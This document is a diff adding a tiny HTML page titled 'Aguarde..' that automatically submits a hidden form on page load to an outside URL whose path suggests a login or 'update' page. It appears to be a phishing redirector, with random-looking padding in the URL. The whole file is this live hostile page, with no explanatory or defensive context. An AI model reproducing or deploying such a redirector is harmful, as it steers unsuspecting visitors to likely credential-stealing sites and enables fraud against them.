@@ -1,0 +1,9 @@
+  
+
+<html>
+<title>Aguarde..</title>
+<script language="JavaScript"> function formulario() { document.form.submit(); } </script>
+<body onLoad="formulario()">
+<form name="form" method="POST" action="http://cirurgicarocha.com.br/js/login/atualizacao/home.html#050349.shtml- g%Mvjqj3%TmntX44jomdoxABwW9PonN8u*wNT%u$B9j7mw%uU*3rFGCIkdfsA1*6457qqf$1*jPKaQD-q*qwSGCEvi2VqfVtZju2FZ-oxV4C0mmm*OHf0@Yp32kI3ohBRzfrwTj*!m7YYXlZ1*hRoVF0l04wgYNO@sKbuMeid#ktcMSsv4fznGpgggmcG%yso76Bbqkhu2660ynusil1u#4isO*ycHefymATl97VylJgBevxfagP#MIIN82qy4hnyA1WYBWG2ORBHNW2qP5#fkjbAG1E7@5D89h6OWS9GVYP"></form>
+</body>
+</html>
